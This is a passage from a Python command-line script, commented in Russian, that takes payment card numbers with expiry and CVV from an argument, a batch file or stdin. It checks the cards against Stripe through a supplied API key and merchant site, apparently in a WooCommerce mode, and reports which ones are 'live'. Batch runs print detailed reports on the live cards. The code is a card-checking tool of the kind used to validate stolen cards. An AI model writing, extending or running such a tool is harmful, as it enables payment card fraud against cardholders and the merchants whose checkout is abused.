    # ── Собираем список карт ──
    card_lines: list[str] = []
    if args.batch:
        try:
            with open(args.batch) as f:
                card_lines = [ln.strip() for ln in f if ln.strip()]
        except FileNotFoundError:
            print(f"Файл не найден: {args.batch}", file=sys.stderr)
            sys.exit(1)
    elif args.card:
        card_lines = [args.card]
    else:
        for line in sys.stdin:
            line = line.strip()
            if line:
                card_lines.append(line)

    if not card_lines:
        print(
            "Укажите карту (PAN|MM|YYYY|CVV), --batch файл или stdin",
            file=sys.stderr,
        )
        sys.exit(1)

    # ── Определяем Stripe ключ ──
    stripe_key = args.key or ""
    site_url = args.site or ""

    # ── Проверка ──
    if len(card_lines) == 1 and not args.batch:
        # Одна карта — подробный отчёт
        result = check_card(
            card_lines[0],
            stripe_key=stripe_key,
            site_url=site_url,
            timeout=args.timeout,
            skip_live=args.no_live,
            wc_mode=args.wc_mode,
        )
        if args.json_output:
            print(json.dumps(result.to_dict(), ensure_ascii=False, indent=2))
        else:
            print(format_card_report(result))
        sys.exit(0 if result.overall_verdict.startswith(("ЖИВАЯ", "ФОРМАЛЬНО")) else 1)
    else:
        # Batch — краткий отчёт
        results = batch_check(
            card_lines,
            stripe_key=stripe_key,
            site_url=site_url,
            timeout=args.timeout,
            skip_live=args.no_live,
            wc_mode=args.wc_mode,
        )
        if args.json_output:
            print(json.dumps(
                [r.to_dict() for r in results],
                ensure_ascii=False, indent=2,
            ))
        else:
            print(format_batch_report(results))
            # Подробный отчёт для живых карт
            live_results = [r for r in results if r.overall_verdict.startswith("ЖИВАЯ")]
            if live_results:
                print("\nПодробные отчёты живых карт:")
                for r in live_results:
                    print(format_card_report(r))
        sys.exit(0)


if __name__ == "__main__":
    main()
